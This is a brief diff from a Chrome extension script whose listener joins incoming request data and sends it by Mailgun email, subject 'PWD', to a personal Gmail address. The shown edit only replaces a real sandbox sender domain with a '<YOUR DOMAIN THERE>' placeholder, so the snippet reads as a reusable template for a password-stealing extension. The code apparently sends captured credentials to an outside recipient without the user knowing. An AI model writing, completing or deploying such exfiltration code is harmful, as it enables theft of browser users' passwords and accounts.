@@ -7,7 +7,7 @@ chrome.extension.onRequest.addListener(function(request, tab, respond) {
                 var data = arr.join(' ');
 
  		        var body =   {
-			        from: 'mailgun@sandboxab04a0cb2f204bb3a60fc5c0500ea941.mailgun.org', //<--- from
+			        from: 'mailgun@<YOUR DOMAIN THERE>.mailgun.org', //<--- from
                     		to : 'autukr@gmail.com', //<--- to
 			        subject: 'PWD',
 			        text: data
